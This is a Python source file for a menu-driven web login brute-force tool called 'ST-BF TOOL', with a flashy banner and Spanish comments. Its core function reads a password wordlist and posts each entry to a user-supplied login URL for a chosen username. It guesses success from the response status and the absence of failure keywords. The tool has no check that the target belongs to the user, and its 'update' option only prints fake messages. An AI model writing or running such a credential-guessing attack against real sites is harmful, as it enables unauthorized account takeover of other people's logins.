#!/usr/bin/env python3
import requests
import time
import os
import subprocess

# Colores para passwords
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# Banner y presentación en lolcat
def banner():
    banner_text = """
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                                                  ┃
┃        ⚡🔥  ST-BF TOOL  🔥⚡                    ┃
┃                                                  ┃
┃        🌐 Brute Force Web  Tool 🌐               ┃
┃                                                  ┃
┃  Created by: satan                               ┃
┃  Version: 1.0                                    ┃
┃                                                  ┃
┃  🚀 Hack your own web, test security, learn ⚡   ┃
┃  💀 Bring the darkness, find the keys 🔑         ┃
┃                                                  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
"""
    try:
        subprocess.run(f"echo '{banner_text}' | lolcat", shell=True)
    except:
        print(banner_text)
# Brute Force
def brute_force():
    import requests
    import os
    import time

    url = input("\nEnter your web login URL (localhost or your domain): ").strip()
    username = input("Enter username: ").strip()

    # Pedir solo el nombre del wordlist
    wordlist_name = input("Enter wordlist name: ").strip()
    wordlist_file = f"wordlists/{wordlist_name}"

    # Verificar existencia y leer passwords
    if not os.path.isfile(wordlist_file):
        print(f"[ERROR] {wordlist_file} not found!")
        return

    try:
        with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [p.strip() for p in f if p.strip() != ""]
    except Exception as e:
        print(f"[ERROR] Could not read wordlist file: {e}")
        return

    if not passwords:
        print(f"[ERROR] Wordlist {wordlist_file} is empty.")
        return

    total = len(passwords)
    print(f"\nStarting brute force on {url} for user {username} with {total} passwords...\n")

    for idx, pwd in enumerate(passwords, start=1):
        print(f"Trying password ({idx}/{total})", end="\r", flush=True)
        try:
            r = requests.post(url, data={"username": username, "password": pwd}, timeout=8, allow_redirects=True)
            # Heurística básica de éxito
            if r.status_code in (200, 301, 302):
                body = r.text.lower()
                fail_signs = ["invalid", "incorrect", "failed", "error", "try again"]
                if not any(s in body for s in fail_signs) or r.history:
                    print(f"\n✅ Password found! ✅")
                    print(f"The password is: {pwd}")
                    break
        except requests.RequestException:
            pass
        time.sleep(0.1)

    print("\nBrute force finished.")

# Update tool
def update_tool():
    msg = "[INFO] Updating tool..."
    try:
        subprocess.run(f"echo '{msg}' | lolcat", shell=True)
    except:
        print(msg)
    time.sleep(0.5)
    msg2 = "[INFO] Tool updated."
    try:
        subprocess.run(f"echo '{msg2}' | lolcat", shell=True)
    except:
        print(msg2)
    input("Press Enter to return to menu...")

# Menu
def main_menu():
    while True:
        os.system("clear")
        banner()
        try:
            subprocess.run(f"echo '1. Enter brute force 🔐' | lolcat", shell=True)
            subprocess.run(f"echo '2. Exit 🚪' | lolcat", shell=True)
            subprocess.run(f"echo '3. Update tool ⚡' | lolcat", shell=True)
        except:
            print("1. Enter brute force 🔐")
            print("2. Exit 🚪")
            print("3. Update tool ⚡")

        choice = input("Select option: ").strip()

        if choice == "1":
            brute_force()
            input("Press Enter to return to menu...")
        elif choice == "2":
            try:
                subprocess.run("echo 'Exiting...' | lolcat", shell=True)
            except:
                print("Exiting...")
            break
        elif choice == "3":
            update_tool()
        else:
            print(RED + "Invalid option. Try again." + RESET)
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
